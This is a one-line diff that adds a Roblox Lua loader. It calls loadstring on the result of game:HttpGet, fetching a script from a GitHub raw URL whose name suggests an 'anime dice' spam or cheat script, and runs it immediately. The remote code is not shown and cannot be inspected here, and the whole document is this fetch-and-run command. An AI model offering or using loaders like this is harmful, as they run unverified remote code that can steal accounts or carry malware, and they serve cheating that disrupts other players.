@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/anime-dice-spam1-8p3uxgr3jpz04e.lua"))()
